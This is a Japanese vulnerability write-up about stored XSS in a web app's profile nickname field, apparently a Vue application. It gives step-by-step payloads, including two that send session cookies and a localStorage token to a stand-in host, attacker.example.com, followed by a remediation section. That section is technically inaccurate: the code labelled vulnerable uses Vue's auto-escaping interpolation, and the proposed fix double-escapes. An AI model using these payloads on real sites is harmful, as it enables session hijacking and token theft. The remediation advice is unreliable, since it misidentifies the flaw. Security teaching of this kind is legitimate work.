# プロフィール表示機能のXSS

## 脆弱性の説明
プロフィールのニックネーム表示で、ユーザー入力を適切にエスケープせずに表示しているため、クロスサイトスクリプティング（XSS）が可能です。

## 影響範囲
- 悪意のあるスクリプトの実行
- ユーザーセッションの盗取
- 不正な操作の実行

## 攻撃方法と手順

### 1. 基本的なXSS攻撃

1. アプリケーションにログインします
2. プロフィール更新ページにアクセスします
3. ニックネームフィールドに以下のXSSペイロードを入力します：
   ```html
   <script>alert('XSS攻撃が成功しました！');</script>
   ```
4. 更新ボタンをクリックします
5. プロフィールページにアクセスすると、アラートダイアログが表示されます

### 2. クッキー盗取攻撃

1. アプリケーションにログインします
2. プロフィール更新ページにアクセスします
3. ニックネームフィールドに以下のXSSペイロードを入力します：
   ```html
   <img src="x" onerror="fetch('https://attacker.example.com/steal?cookie='+encodeURIComponent(document.cookie))">
   ```
   または
   ```html
   <script>
   fetch('https://attacker.example.com/steal?token='+encodeURIComponent(localStorage.getItem('token')))
   </script>
   ```
4. 更新ボタンをクリックします
5. プロフィールページにアクセスすると、バックグラウンドでトークン情報が攻撃者のサーバーに送信されます

このペイロードは、ユーザーのクッキーやローカルストレージに保存されたトークンを攻撃者のサーバーに送信しようとします。実際の攻撃では、攻撃者が制御するサーバーのURLを使用します。

### 3. イベントハンドラを使用したXSS攻撃

1. アプリケーションにログインします
2. プロフィール更新ページにアクセスします
3. ニックネームフィールドに以下のXSSペイロードを入力します：
   ```html
   <div onmouseover="alert('マウスオーバーでXSS攻撃が実行されました！')">プロフィール情報</div>
   ```
   または
   ```html
   <a href="javascript:alert('リンククリックでXSS攻撃が実行されました！')">プロフィールリンク</a>
   ```
4. 更新ボタンをクリックします
5. プロフィールページにアクセスし、要素にマウスオーバーするかリンクをクリックすると、アラートダイアログが表示されます

## 攻撃成功の確認手順

### 1. 基本的なXSS攻撃の確認

1. 上記の基本的なXSSペイロードを使用してプロフィールを更新します
2. プロフィールページにアクセスします
3. アラートダイアログが表示されれば、XSS攻撃が成功しています

### 2. コンソールログでのXSS確認

1. ブラウザの開発者ツールを開きます（F12キー）
2. 「Console」タブを選択します
3. 以下のXSSペイロードを使用してプロフィールを更新します：
   ```html
   <script>console.log('XSS攻撃が成功しました！');</script>
   ```
4. プロフィールページにアクセスします
5. コンソールに「XSS攻撃が成功しました！」というメッセージが表示されれば、XSS攻撃が成功しています

### 3. DOM操作の確認

1. 以下のXSSペイロードを使用してプロフィールを更新します：
   ```html
   <script>document.body.style.backgroundColor = 'red';</script>
   ```
2. プロフィールページにアクセスします
3. ページの背景色が赤に変わっていれば、XSS攻撃が成功しています

## 対策方法
### 1. エスケープ処理の実施
```javascript
// ユーティリティ関数の作成
function escapeHtml(text) {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// コンポーネントでの使用
export default {
  computed: {
    safeNickname() {
      return escapeHtml(this.user.nickname);
    }
  }
}
```

### 2. v-textディレクティブの使用
```vue
<!-- 修正前（脆弱なコード） -->
<template>
  <div>{{ user.nickname }}</div>
</template>

<!-- 修正後（安全なコード） -->
<template>
  <div v-text="safeNickname"></div>
</template>
```
